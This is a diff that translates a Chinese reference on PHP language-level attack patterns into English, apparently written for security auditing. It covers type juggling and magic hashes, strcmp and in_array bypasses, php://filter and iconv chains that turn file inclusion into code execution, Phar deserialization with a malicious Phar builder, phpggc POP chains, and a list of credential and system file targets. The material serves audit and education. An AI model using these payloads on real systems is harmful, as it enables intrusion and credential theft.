@@ -1,93 +1,93 @@
-# PHP 语言层特有攻击模式
+# PHP Language-Level Attack Patterns
 
-PHP 语言自身的类型系统、内置函数、协议处理器等带来的安全问题。
-本文件聚焦 **PHP 语言级别** 的独特安全陷阱，不涉及框架层面（见 `framework_patterns.md`）或通用 Payload（见 `payload_templates.md`）。
+Security issues arising from PHP's own type system, built-in functions, protocol handlers, etc.
+This file focuses on **PHP language-level** unique security pitfalls, excluding framework-level topics (see `framework_patterns.md`) or general payloads (see `payload_templates.md`).
 
 ---
 
-## Type Juggling（类型杂耍）完整参考表
+## Type Juggling Complete Reference Table
 
-### `==` vs `===` 比较行为差异
+### `==` vs `===` Comparison Behavior Differences
 
-PHP 的 `==`（松散比较）会在比较前进行隐式类型转换，这是大量认证绕过的根源。
+PHP's `==` (loose comparison) performs implicit type conversion before comparison, which is the root cause of numerous authentication bypasses.
 
-#### 松散比较真值表（以下均为 `==` 返回 `true` 的组合）
+#### Loose Comparison Truth Table (all combinations below return `true` with `==`)
 
 ```
 ┌────────────────────────────────────────────────────────────────┐
-│  表达式                          │  结果   │  原因              │
+│  Expression                      │  Result │  Reason                         │
 ├────────────────────────────────────────────────────────────────┤
-│  0 == "any_string"               │  TRUE   │  字符串转为 int 0  │
-│  0 == ""                         │  TRUE   │  空串转为 0        │
-│  0 == null                       │  TRUE   │  null 转为 0       │
-│  0 == false                      │  TRUE   │  false 转为 0      │
-│  "" == null                      │  TRUE   │  均视为空值         │
-│  "" == false                     │  TRUE   │  空串视为 falsy     │
-│  null == false                   │  TRUE   │  均为空类型         │
-│  "0" == false                    │  TRUE   │  "0" 是 falsy      │
-│  "0" == null                     │  FALSE  │  注意：这个是 false │
-│  "0e123" == "0e456"              │  TRUE   │  均解析为科学计数 0 │
-│  "0e123" == 0                    │  TRUE   │  科学计数值为 0     │
-│  "1" == "01"                     │  TRUE   │  数值字符串比较     │
-│  "1" == "1.0"                    │  TRUE   │  数值字符串比较     │
-│  "123" == 123                    │  TRUE   │  字符串转为 int     │
-│  1 == "1abc"                     │  TRUE   │  "1abc" 转为 1     │
-│  true == "any_nonzero_string"    │  TRUE   │  非空串转为 true    │
-│  true == 1                       │  TRUE   │  1 转为 true       │
-│  true == -1                      │  TRUE   │  非零转为 true      │
-│  true == [1]                     │  TRUE   │  非空数组为 true    │
-│  INF == INF                      │  TRUE   │  无穷等于无穷       │
-│  "php" == 0                      │  TRUE   │  "php" 转为 0      │
-│  "1e1" == "10"                   │  TRUE   │  1e1 = 10          │
+│  0 == "any_string"               │  TRUE   │  string converted to int 0      │
+│  0 == ""                         │  TRUE   │  empty string converted to 0    │
+│  0 == null                       │  TRUE   │  null converted to 0            │
+│  0 == false                      │  TRUE   │  false converted to 0           │
+│  "" == null                      │  TRUE   │  both treated as empty          │
+│  "" == false                     │  TRUE   │  empty string is falsy          │
+│  null == false                   │  TRUE   │  both are empty types           │
+│  "0" == false                    │  TRUE   │  "0" is falsy                   │
+│  "0" == null                     │  FALSE  │  note: this one is false        │
+│  "0e123" == "0e456"              │  TRUE   │  both parsed as scientific 0    │
+│  "0e123" == 0                    │  TRUE   │  scientific notation value is 0 │
+│  "1" == "01"                     │  TRUE   │  numeric string comparison      │
+│  "1" == "1.0"                    │  TRUE   │  numeric string comparison      │
+│  "123" == 123                    │  TRUE   │  string converted to int        │
+│  1 == "1abc"                     │  TRUE   │  "1abc" converted to 1          │
+│  true == "any_nonzero_string"    │  TRUE   │  non-empty string is true       │
+│  true == 1                       │  TRUE   │  1 converted to true            │
+│  true == -1                      │  TRUE   │  non-zero converted to true     │
+│  true == [1]                     │  TRUE   │  non-empty array is true        │
+│  INF == INF                      │  TRUE   │  infinity equals infinity       │
+│  "php" == 0                      │  TRUE   │  "php" converted to 0           │
+│  "1e1" == "10"                   │  TRUE   │  1e1 = 10                       │
 └────────────────────────────────────────────────────────────────┘
 ```
 
-> **PHP 8.0 行为变更**：`0 == "string"` 在 PHP 8.0+ 返回 `FALSE`（non-numeric string 不再转为 0）。
-> 但 `"0e123" == "0e456"` 仍为 `TRUE`（两者都是合法的 numeric string）。
+> **PHP 8.0 Behavior Change**: `0 == "string"` returns `FALSE` in PHP 8.0+ (non-numeric strings are no longer converted to 0).
+> However, `"0e123" == "0e456"` is still `TRUE` (both are valid numeric strings).
 
-#### 原理说明
+#### How It Works
 
-PHP 松散比较（`==`）遵循复杂的类型转换规则：当比较双方类型不同时，PHP 尝试将其转为共同类型。字符串与整数比较时，字符串被 `intval()` 转换；两个 numeric-looking 字符串比较时，按数值比较。
+PHP loose comparison (`==`) follows complex type conversion rules: when the two sides have different types, PHP attempts to convert them to a common type. When comparing a string with an integer, the string is converted via `intval()`; when comparing two numeric-looking strings, they are compared by numeric value.
 
-#### 检测方法
+#### Detection Method
 
 ```
-在代码中搜索以下模式：
+Search for the following patterns in the code:
 - if ($user_input == $secret)
 - if ($token == $stored_token)
 - if ($password == $hash)
-- switch($input) { case "admin": ... }（switch 使用松散比较）
+- switch($input) { case "admin": ... } (switch uses loose comparison)
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 场景：认证绕过
-// 代码: if ($_GET['password'] == $admin_password)
-// 当 $admin_password = "0e123456789" (以 0e 开头的哈希)
-// 攻击: ?password=0  → 0 == "0e123456789" → 0 == 0.0 → TRUE
+// Scenario: authentication bypass
+// Code: if ($_GET['password'] == $admin_password)
+// When $admin_password = "0e123456789" (hash starting with 0e)
+// Attack: ?password=0  → 0 == "0e123456789" → 0 == 0.0 → TRUE
 
-// 场景：JSON 类型绕过
-// 代码: if ($_POST['pin'] == "0000")
-// 攻击: Content-Type: application/json → {"pin": 0}
+// Scenario: JSON type bypass
+// Code: if ($_POST['pin'] == "0000")
+// Attack: Content-Type: application/json → {"pin": 0}
 // 0 == "0000" → TRUE (int 0 vs string)
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> 所有涉及密码、token、验证码的比较 **必须使用 `===`**。JSON 输入额外危险，因为 `json_decode` 会保留 integer 类型，直接绕过字符串比较。
+> All comparisons involving passwords, tokens, and verification codes **MUST use `===`**. JSON input is especially dangerous because `json_decode` preserves the integer type, directly bypassing string comparison.
 
 ---
 
-### Magic Hash 列表
+### Magic Hash List
 
-以下明文经 MD5/SHA1 哈希后产生 `0e[0-9]+` 格式的结果，在松散比较中均等于 `0`：
+The following plaintexts produce `0e[0-9]+` format results after MD5/SHA1 hashing, all equal to `0` in loose comparison:
 
 #### MD5 Magic Hash
 
 ```
 ┌──────────────────┬──────────────────────────────────────┐
-│  明文             │  MD5 哈希值                           │
+│  Plaintext        │  MD5 Hash Value                      │
 ├──────────────────┼──────────────────────────────────────┤
 │  240610708       │  0e462097431906509019562988736854     │
 │  QNKCDZO        │  0e830400451993494058024219903391     │
@@ -105,7 +105,7 @@ PHP 松散比较（`==`）遵循复杂的类型转换规则：当比较双方类
 
 ```
 ┌──────────────────┬──────────────────────────────────────────────┐
-│  明文             │  SHA1 哈希值                                  │
+│  Plaintext        │  SHA1 Hash Value                             │
 ├──────────────────┼──────────────────────────────────────────────┤
 │  aaroZmOk       │  0e66507019969427134894567494305185566735     │
 │  aaK1STfY       │  0e76658526655756207688271159624026011393     │
@@ -114,299 +114,299 @@ PHP 松散比较（`==`）遵循复杂的类型转换规则：当比较双方类
 └──────────────────┴──────────────────────────────────────────────┘
 ```
 
-#### 原理说明
+#### How It Works
 
-当 `md5($input)` 返回 `0e[0-9]+` 格式字符串时，PHP 将其解释为科学计数法 `0 * 10^N = 0`。两个这样的哈希值松散比较永远相等。
+When `md5($input)` returns a string in the `0e[0-9]+` format, PHP interprets it as scientific notation `0 * 10^N = 0`. Two such hash values will always be equal in loose comparison.
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索模式: if (md5($input) == md5($stored))
-搜索模式: if (sha1($input) == $hash)
-搜索模式: if (hash('md5', $x) == hash('md5', $y))
+Search pattern: if (md5($input) == md5($stored))
+Search pattern: if (sha1($input) == $hash)
+Search pattern: if (hash('md5', $x) == hash('md5', $y))
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 代码: if (md5($_GET['pass']) == $stored_md5_hash)
-// 若 $stored_md5_hash 恰好以 0e 开头且后跟纯数字
-// 攻击: ?pass=240610708 → md5("240610708") = "0e462..." == "0e..." → TRUE
-// 或: ?pass=QNKCDZO
+// Code: if (md5($_GET['pass']) == $stored_md5_hash)
+// If $stored_md5_hash happens to start with 0e followed by only digits
+// Attack: ?pass=240610708 → md5("240610708") = "0e462..." == "0e..." → TRUE
+// Or: ?pass=QNKCDZO
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> Magic Hash 攻击需要存储的哈希恰好也是 `0e` 开头。实战中常配合注册功能——注册用户密码为 `240610708`，再用另一个 magic hash 登录其他用户。
+> Magic Hash attacks require that the stored hash also starts with `0e`. In real-world scenarios, this is often combined with registration functionality — register a user with password `240610708`, then use another magic hash to log into other users' accounts.
 
 ---
 
-### strcmp() / in_array() / switch 类型混淆
+### strcmp() / in_array() / switch Type Confusion
 
-#### strcmp() 数组绕过
+#### strcmp() Array Bypass
 
 ```php
-// 漏洞代码
+// Vulnerable code
 if (!strcmp($_POST['password'], $secret)) {
-    // 认证通过
+    // Authentication passed
 }
 
-// 原理: strcmp(array, string) 返回 NULL (并产生 Warning)
-// !NULL === true → 认证绕过
-// 攻击: POST password[]=anything
+// How it works: strcmp(array, string) returns NULL (and triggers a Warning)
+// !NULL === true → authentication bypass
+// Attack: POST password[]=anything
 ```
 
-#### 原理说明
+#### How It Works
 
-`strcmp()` 接收非字符串参数时返回 `NULL` 而非 `0` 或非零整数。`!NULL` 在 PHP 中为 `true`，与 `!0`（正常匹配成功的返回值）行为一致。
+`strcmp()` returns `NULL` instead of `0` or a non-zero integer when receiving a non-string argument. `!NULL` evaluates to `true` in PHP, which behaves identically to `!0` (the return value on successful match).
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索模式: if (!strcmp($input, $secret))
-搜索模式: if (strcmp($x, $y) == 0)   ← 松散比较 NULL == 0 也为 TRUE
-安全写法: if (strcmp($x, $y) === 0)  ← 严格比较
+Search pattern: if (!strcmp($input, $secret))
+Search pattern: if (strcmp($x, $y) == 0)   ← loose comparison NULL == 0 is also TRUE
+Safe pattern:   if (strcmp($x, $y) === 0)   ← strict comparison
 ```
 
-#### in_array() 松散比较绕过
+#### in_array() Loose Comparison Bypass
 
 ```php
-// 漏洞代码
+// Vulnerable code
 $whitelist = [1, 2, 3, 4, 5];
 if (in_array($_GET['page'], $whitelist)) {
-    include $_GET['page'];  // 危险！
+    include $_GET['page'];  // Dangerous!
 }
 
-// 原理: in_array() 默认使用松散比较
-// in_array("1exploit.php", [1,2,3]) → TRUE (因为 "1exploit.php" == 1)
-// 攻击: ?page=1exploit.php → 绕过白名单并包含任意文件
+// How it works: in_array() uses loose comparison by default
+// in_array("1exploit.php", [1,2,3]) → TRUE (because "1exploit.php" == 1)
+// Attack: ?page=1exploit.php → bypasses whitelist and includes arbitrary file
 ```
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索: in_array($var, $array) ← 缺少第三个参数 true
-安全写法: in_array($var, $array, true)  ← 严格模式
+Search for: in_array($var, $array) ← missing the third parameter true
+Safe pattern: in_array($var, $array, true)  ← strict mode
 ```
 
-#### switch-case 松散比较
+#### switch-case Loose Comparison
 
 ```php
-// 漏洞代码
+// Vulnerable code
 switch ($_GET['action']) {
     case 0:
-        admin_panel();  // 管理面板
+        admin_panel();  // admin panel
         break;
     case 1:
         user_panel();
         break;
 }
 
-// 原理: switch 使用 == 松散比较
-// "anything" == 0 → TRUE → 任意字符串匹配 case 0
-// 攻击: ?action=anything → 进入 admin_panel()
+// How it works: switch uses == loose comparison
+// "anything" == 0 → TRUE → any string matches case 0
+// Attack: ?action=anything → enters admin_panel()
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> `strcmp()` 传数组返回 NULL；`in_array()` 默认松散比较；`switch` 始终松散比较。三者都是常见的 PHP 认证/授权绕过向量。
+> `strcmp()` returns NULL when passed an array; `in_array()` uses loose comparison by default; `switch` always uses loose comparison. All three are common PHP authentication/authorization bypass vectors.
 
 ---
 
-## php://filter 链完整参考
+## php://filter Chain Complete Reference
 
-### 基础用法：源码泄露
+### Basic Usage: Source Code Disclosure
 
-#### 原理说明
+#### How It Works
 
-`php://filter` 是 PHP 的流包装器（stream wrapper），允许在读取资源前对数据施加过滤器。`convert.base64-encode` 将 PHP 文件内容 Base64 编码后输出，防止被当作 PHP 执行。
+`php://filter` is a PHP stream wrapper that allows applying filters to data before reading a resource. `convert.base64-encode` Base64-encodes the PHP file content before output, preventing it from being executed as PHP.
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索存在 LFI 的 include/require：
+Search for include/require with LFI:
 - include($_GET['file']);
 - include($page . '.php');
 - require_once($template);
 - file_get_contents($user_input);
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```
-# 基础源码读取
+# Basic source code reading
 php://filter/convert.base64-encode/resource=config.php
 php://filter/convert.base64-encode/resource=../config/database.php
 php://filter/convert.base64-encode/resource=index
 
-# 多过滤器串联
+# Multiple filter chaining
 php://filter/string.rot13/resource=config.php
 php://filter/convert.base64-encode|convert.base64-encode/resource=config.php
 
-# 写入场景（若存在 file_put_contents + filter）
+# Write scenario (if file_put_contents + filter exists)
 php://filter/convert.base64-decode/resource=shell.php
-# 先 base64 编码 webshell，写入时自动解码
+# Base64-encode the webshell first, it will be automatically decoded on write
 ```
 
-### 高级用法：iconv filter chain 构造任意内容
+### Advanced Usage: iconv Filter Chain for Arbitrary Content Construction
 
-#### 原理说明
+#### How It Works
 
-PHP 7+ 的 `convert.iconv` 过滤器可以在字符编码转换过程中引入特定字节。通过精心编排多个 iconv 转换链，可以从空内容逐步构造出任意字符串（如 `<?php system($_GET[0]);?>`）。这使得即使目标文件不存在或为空，也能通过 LFI 实现 RCE。
+PHP 7+'s `convert.iconv` filter can introduce specific bytes during character encoding conversion. By carefully orchestrating multiple iconv conversion chains, arbitrary strings (e.g., `<?php system($_GET[0]);?>`) can be constructed from empty content. This enables RCE through LFI even when the target file does not exist or is empty.
 
-#### 检测方法
-
-```
-只要存在 LFI（include/require 可控），即可能利用 iconv chain。
-工具: https://github.com/synacktiv/php_filter_chain_generator
-```
-
-#### Payload 示例
+#### Detection Method
 
 ```
-# 使用工具生成（生成 <?php system('id');?> 的 filter chain）
+As long as LFI exists (controllable include/require), iconv chain exploitation is possible.
+Tool: https://github.com/synacktiv/php_filter_chain_generator
+```
+
+#### Payload Examples
+
+```
+# Using the tool to generate (generates a filter chain for <?php system('id');?>)
 python3 php_filter_chain_generator.py --chain '<?php system("id");?>'
 
-# 输出格式（极长的 filter chain）：
+# Output format (extremely long filter chain):
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|
-convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|...(省略数百个转换)...|
+convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|...(hundreds of conversions omitted)...|
 convert.base64-decode/resource=php://temp
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> php://filter 是 LFI 的瑞士军刀。基础用法泄露源码，高级 iconv chain 可实现无文件 RCE。审计时发现任何 `include` 参数可控，即应标记为高危。
+> php://filter is the Swiss Army knife of LFI. Basic usage discloses source code; advanced iconv chains can achieve fileless RCE. During auditing, any controllable `include` parameter SHOULD be flagged as high severity.
 
 ---
 
-### 常见 LFI 目标路径列表
+### Common LFI Target Path List
 
 ```
-# Linux 系统文件
+# Linux System Files
 /etc/passwd
-/etc/shadow                          # 需 root 权限
+/etc/shadow                          # requires root privileges
 /etc/hosts
-/proc/self/environ                   # 环境变量，含 User-Agent（可投毒）
-/proc/self/cmdline                   # 进程命令行
-/proc/self/fd/[0-9]                  # 打开的文件描述符
-/proc/self/status                    # 进程信息
+/proc/self/environ                   # environment variables, contains User-Agent (can be poisoned)
+/proc/self/cmdline                   # process command line
+/proc/self/fd/[0-9]                  # open file descriptors
+/proc/self/status                    # process information
 
-# Web 服务器日志（Log Poisoning 目标）
+# Web Server Logs (Log Poisoning targets)
 /var/log/apache2/access.log
 /var/log/apache2/error.log
 /var/log/nginx/access.log
 /var/log/nginx/error.log
 /var/log/httpd/access_log            # CentOS/RHEL
 
-# PHP 配置与会话
+# PHP Configuration & Sessions
 /etc/php.ini
 /etc/php/7.4/fpm/php.ini
-/tmp/sess_<PHPSESSID>                # PHP Session 文件
-/var/lib/php/sessions/sess_<ID>      # Debian/Ubuntu session 路径
+/tmp/sess_<PHPSESSID>                # PHP Session files
+/var/lib/php/sessions/sess_<ID>      # Debian/Ubuntu session path
 
-# 应用配置文件
-.env                                 # Laravel/通用环境配置
+# Application Configuration Files
+.env                                 # Laravel/general environment config
 config.php
 wp-config.php                        # WordPress
 configuration.php                    # Joomla
 settings.php                         # Drupal
 ```
 
-### Null Byte 截断（PHP < 5.3.4）
+### Null Byte Truncation (PHP < 5.3.4)
 
-#### 原理说明
+#### How It Works
 
-PHP 5.3.4 之前，底层 C 函数使用 `\0`（null byte）作为字符串终止符。攻击者可以在文件路径中注入 `%00` 来截断后缀。
+Before PHP 5.3.4, the underlying C functions used `\0` (null byte) as the string terminator. Attackers could inject `%00` into file paths to truncate the suffix.
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 代码: include($_GET['page'] . '.php');
-// 攻击 (PHP < 5.3.4): ?page=../../../etc/passwd%00
-// 效果: include("../../../etc/passwd\0.php") → 实际读取 /etc/passwd
+// Code: include($_GET['page'] . '.php');
+// Attack (PHP < 5.3.4): ?page=../../../etc/passwd%00
+// Effect: include("../../../etc/passwd\0.php") → actually reads /etc/passwd
 
-// 代码: include($_GET['lang'] . '/header.tpl');
-// 攻击: ?lang=php://filter/convert.base64-encode/resource=config.php%00
+// Code: include($_GET['lang'] . '/header.tpl');
+// Attack: ?lang=php://filter/convert.base64-encode/resource=config.php%00
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> Null byte 截断仅在 PHP < 5.3.4 有效，现代 PHP 已修复。但老系统仍然大量存在，审计时需确认 PHP 版本。
+> Null byte truncation only works on PHP < 5.3.4; modern PHP has fixed this. However, legacy systems still widely exist, and auditors MUST verify the PHP version.
 
 ---
 
-## PHP 反序列化 Cookie/Session 模式
+## PHP Deserialization Cookie/Session Patterns
 
-### 标准序列化格式解析
+### Standard Serialization Format Reference
 
 ```
-类型标记:
+Type markers:
   b:1;                              → boolean true
   i:42;                             → integer 42
   d:3.14;                           → double 3.14
-  s:5:"hello";                      → string "hello" (长度:5)
+  s:5:"hello";                      → string "hello" (length: 5)
   a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}  → array ["foo", "bar"]
-  O:8:"ClassName":1:{s:4:"prop";s:5:"value";}  → 对象
+  O:8:"ClassName":1:{s:4:"prop";s:5:"value";}  → object
 
-属性可见性编码:
+Property visibility encoding:
   s:4:"name"          → public $name
-  s:14:"\0ClassName\0name"  → private $name (\0 是 null byte)
+  s:14:"\0ClassName\0name"  → private $name (\0 is null byte)
   s:7:"\0*\0name"     → protected $name
 ```
 
-#### 原理说明
+#### How It Works
 
-PHP `unserialize()` 会自动调用对象的魔术方法（`__wakeup`, `__destruct`, `__toString` 等）。攻击者构造恶意序列化数据，利用已有类的魔术方法链（POP chain）实现任意代码执行。
+PHP's `unserialize()` automatically invokes an object's magic methods (`__wakeup`, `__destruct`, `__toString`, etc.). Attackers craft malicious serialized data that leverages existing classes' magic method chains (POP chains) to achieve arbitrary code execution.
 
-#### 检测方法
+#### Detection Method
 
 ```
-直接危险函数:
+Directly dangerous functions:
 - unserialize($_GET/POST/COOKIE/REQUEST[...])
 - unserialize(base64_decode($input))
 - unserialize(gzuncompress($input))
 
-间接触发:
-- phar:// 协议触发（见下方）
-- session.serialize_handler 不一致
+Indirect triggers:
+- phar:// protocol trigger (see below)
+- session.serialize_handler inconsistency
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 基础 POC
+// Basic POC
 O:8:"FilePath":1:{s:4:"path";s:11:"/etc/passwd";}
 
-// __wakeup 绕过 (CVE-2016-7124, PHP 5 < 5.6.25, PHP 7 < 7.0.10)
-// 原理: 声明的属性数 > 实际属性数 → __wakeup 不被调用
-// 原始: O:4:"Test":1:{s:4:"data";s:4:"safe";}
-// 绕过: O:4:"Test":2:{s:4:"data";s:7:"exploit";}  ← 属性数改为 2
+// __wakeup bypass (CVE-2016-7124, PHP 5 < 5.6.25, PHP 7 < 7.0.10)
+// How it works: declared property count > actual property count → __wakeup is not called
+// Original: O:4:"Test":1:{s:4:"data";s:4:"safe";}
+// Bypass:   O:4:"Test":2:{s:4:"data";s:7:"exploit";}  ← property count changed to 2
 ```
 
-### Phar 反序列化触发
+### Phar Deserialization Trigger
 
-#### 原理说明
+#### How It Works
 
-Phar（PHP Archive）文件的 metadata 部分以 PHP 序列化格式存储。任何对 `phar://` 路径执行文件操作的函数都会自动反序列化 metadata，无需显式调用 `unserialize()`。
+The metadata section of Phar (PHP Archive) files is stored in PHP serialization format. Any function performing file operations on a `phar://` path will automatically deserialize the metadata, without an explicit `unserialize()` call.
 
-#### 可触发 Phar 反序列化的函数
+#### Functions That Can Trigger Phar Deserialization
 
 ```
-文件信息类:    file_exists(), is_file(), is_dir(), is_link(), is_writable()
-              file(), fileatime(), filectime(), filemtime(), filesize()
-              filegroup(), fileinode(), fileowner(), fileperms(), filetype()
-文件操作类:    fopen(), copy(), rename(), unlink(), stat(), lstat()
-              readfile(), file_get_contents(), file_put_contents()
-目录操作类:    opendir(), scandir(), glob()
-图像处理类:    getimagesize(), exif_read_data()
-哈希计算类:    md5_file(), sha1_file(), hash_file()
-配置解析类:    parse_ini_file()
+File info:        file_exists(), is_file(), is_dir(), is_link(), is_writable()
+                  file(), fileatime(), filectime(), filemtime(), filesize()
+                  filegroup(), fileinode(), fileowner(), fileperms(), filetype()
+File operations:  fopen(), copy(), rename(), unlink(), stat(), lstat()
+                  readfile(), file_get_contents(), file_put_contents()
+Directory ops:    opendir(), scandir(), glob()
+Image processing: getimagesize(), exif_read_data()
+Hash computation: md5_file(), sha1_file(), hash_file()
+Config parsing:   parse_ini_file()
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 步骤1: 生成恶意 Phar 文件
+// Step 1: Generate malicious Phar file
 $phar = new Phar('evil.phar');
 $phar->startBuffering();
 $phar->addFromString('test.txt', 'test');
@@ -416,228 +416,228 @@ $exploit->cmd = 'id';
 $phar->setMetadata($exploit);
 $phar->stopBuffering();
 
-// 步骤2: 将 evil.phar 重命名为 evil.jpg 上传（绕过扩展名检查）
-// 步骤3: 触发反序列化
-// file_exists('phar://uploads/evil.jpg/test.txt') → 触发 unserialize(metadata)
+// Step 2: Rename evil.phar to evil.jpg for upload (bypass extension check)
+// Step 3: Trigger deserialization
+// file_exists('phar://uploads/evil.jpg/test.txt') → triggers unserialize(metadata)
 ```
 
-### 常见 POP Chain 模式
+### Common POP Chain Patterns
 
 ```
 ┌─────────────┬──────────────────────────────────────────────────────┐
-│  框架        │  POP Chain 入口                                      │
+│  Framework   │  POP Chain Entry Point                               │
 ├─────────────┼──────────────────────────────────────────────────────┤
 │  Laravel     │  PendingBroadcast → __destruct → Dispatcher         │
 │             │  → dispatch() → call_user_func()                    │
-│             │  工具: phpggc Laravel/RCE1~RCE10                      │
+│             │  Tool: phpggc Laravel/RCE1~RCE10                     │
 ├─────────────┼──────────────────────────────────────────────────────┤
-│  Symfony     │  Process → __destruct → 执行 proc_open()            │
-│             │  工具: phpggc Symfony/RCE1~RCE4                       │
+│  Symfony     │  Process → __destruct → executes proc_open()        │
+│             │  Tool: phpggc Symfony/RCE1~RCE4                      │
 ├─────────────┼──────────────────────────────────────────────────────┤
 │  Yii2        │  BatchQueryResult → __destruct → close()            │
 │             │  → DataReader → close() → call_user_func()          │
 ├─────────────┼──────────────────────────────────────────────────────┤
 │  ThinkPHP    │  Windows → __destruct → removeFiles()               │
-│             │  → file_exists() → Phar 二次反序列化                  │
-│             │  工具: phpggc ThinkPHP/RCE1~RCE2                      │
+│             │  → file_exists() → Phar secondary deserialization    │
+│             │  Tool: phpggc ThinkPHP/RCE1~RCE2                     │
 ├─────────────┼──────────────────────────────────────────────────────┤
 │  Monolog     │  BufferHandler → __destruct → close()               │
 │             │  → handle() → StreamHandler → write()               │
-│             │  → file_put_contents() 写 webshell                   │
+│             │  → file_put_contents() writes webshell               │
 ├─────────────┼──────────────────────────────────────────────────────┤
 │  Guzzle      │  FileCookieJar → __destruct → save()                │
-│             │  → file_put_contents() 写 webshell                   │
+│             │  → file_put_contents() writes webshell               │
 └─────────────┴──────────────────────────────────────────────────────┘
 
-# 通用 POP Chain 生成工具
+# General POP Chain generation tool
 phpggc <Framework/Type> <payload>
-# 例: phpggc Laravel/RCE6 'system' 'id'
+# Example: phpggc Laravel/RCE6 'system' 'id'
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> PHP 反序列化不仅限于 `unserialize()` 调用。Phar 协议使得任何文件操作函数都可能成为反序列化入口。审计时搜索所有可控的文件路径参数 + phar:// 协议的可达性。
+> PHP deserialization is not limited to `unserialize()` calls. The Phar protocol makes any file operation function a potential deserialization entry point. During auditing, search for all controllable file path parameters + reachability of the phar:// protocol.
 
 ---
 
-## basename() / 路径处理函数陷阱
+## basename() / Path Handling Function Pitfalls
 
-### basename() 隐患
+### basename() Risks
 
-#### 原理说明
+#### How It Works
 
-`basename()` 提取路径的最后一个组件，但它 **不会过滤** 隐藏文件（`.` 开头）和备份文件（`~` 结尾）。更重要的是，`basename()` 对某些多字节字符会产生意外截断。
+`basename()` extracts the last component of a path, but it **does not filter** hidden files (starting with `.`) or backup files (ending with `~`). More importantly, `basename()` can produce unexpected truncation on certain multi-byte characters.
 
-#### 检测方法
+#### Detection Method
 
 ```
-搜索: basename($path) 用于安全检查
-搜索: 仅依赖 basename() 进行文件名白名单验证
+Search for: basename($path) used in security checks
+Search for: relying solely on basename() for filename whitelist validation
 ```
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 场景: 仅允许访问特定目录的文件
+// Scenario: only allow accessing files in a specific directory
 $file = basename($_GET['file']);
 include("/safe/dir/" . $file);
 
-// 攻击1: ?file=.htaccess → 读取 .htaccess 配置
-// 攻击2: ?file=config.php.bak → 读取备份文件（可能含明文密码）
+// Attack 1: ?file=.htaccess → reads .htaccess configuration
+// Attack 2: ?file=config.php.bak → reads backup file (may contain plaintext passwords)
 
-// basename() 多字节截断（locale 依赖）
+// basename() multi-byte truncation (locale-dependent)
 setlocale(LC_ALL, "C");  // ASCII locale
 basename("/path/to/\xff/etc/passwd");
-// 某些 locale 下可能返回意外结果
+// May return unexpected results under certain locales
 ```
 
-### realpath() 空返回处理
+### realpath() Empty Return Handling
 
-#### 原理说明
+#### How It Works
 
-`realpath()` 在文件不存在时返回 `false`。如果代码未检查返回值，可能导致路径验证绕过。
+`realpath()` returns `false` when the file does not exist. If the code does not check the return value, it may lead to path validation bypass.
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 漏洞代码
+// Vulnerable code
 $path = realpath($_GET['file']);
 if (strpos($path, '/safe/dir/') === 0) {
     readfile($path);
 }
 
-// 攻击: 当文件不存在时 realpath() 返回 false
+// Attack: when the file does not exist, realpath() returns false
 // strpos(false, '/safe/dir/') === false
-// false === 0 → FALSE → 但如果用了 == 而不是 ===
-// strpos(false, ...) == 0 → 注意 strpos 返回值的比较陷阱
+// false === 0 → FALSE → but if == is used instead of ===
+// strpos(false, ...) == 0 → note the strpos return value comparison pitfall
 ```
 
-### pathinfo() 扩展名绕过
+### pathinfo() Extension Bypass
 
-#### 原理说明
+#### How It Works
 
-`pathinfo()` 取最后一个 `.` 后的内容作为扩展名。双扩展名、特殊字符可以绕过基于 `pathinfo()` 的扩展名检查。
+`pathinfo()` takes the content after the last `.` as the extension. Double extensions and special characters can bypass extension checks based on `pathinfo()`.
 
-#### Payload 示例
+#### Payload Examples
 
 ```php
-// 代码: $ext = pathinfo($filename, PATHINFO_EXTENSION);
-// if ($ext !== 'php') { /* 允许上传 */ }
+// Code: $ext = pathinfo($filename, PATHINFO_EXTENSION);
+// if ($ext !== 'php') { /* allow upload */ }
 
-pathinfo('shell.php.jpg', PATHINFO_EXTENSION);   // → "jpg" (绕过检查)
-// 但 Apache 可能按 .php 解析（双扩展名解析漏洞）
+pathinfo('shell.php.jpg', PATHINFO_EXTENSION);   // → "jpg" (bypasses check)
+// But Apache may parse it as .php (double extension parsing vulnerability)
 
 pathinfo('shell.PHP', PATHINFO_EXTENSION);        // → "PHP"
-// 大小写不敏感匹配时可绕过黑名单
+// Can bypass blacklist when matching is case-insensitive
 
-pathinfo('shell.php.', PATHINFO_EXTENSION);       // → "" (空字符串)
-// Windows 下文件名末尾的 . 会被自动去除 → 实际存储为 shell.php
+pathinfo('shell.php.', PATHINFO_EXTENSION);       // → "" (empty string)
+// On Windows, trailing . in filenames is automatically removed → actually stored as shell.php
 
 pathinfo('.htaccess', PATHINFO_EXTENSION);        // → "htaccess"
-// PATHINFO_FILENAME 返回 "" → 可能绕过文件名非空检查
+// PATHINFO_FILENAME returns "" → may bypass non-empty filename checks
 ```
 
-#### Key Insight 总结
+#### Key Insight Summary
 
-> 路径处理函数各有边界条件。安全审计时，不应依赖单一函数做路径安全验证。推荐组合使用 `realpath()` + 目录前缀检查 + 白名单扩展名 + `===` 严格比较。
+> Path handling functions each have their edge cases. During security auditing, you SHOULD NOT rely on a single function for path security validation. It is RECOMMENDED to combine `realpath()` + directory prefix checking + extension whitelist + `===` strict comparison.
 
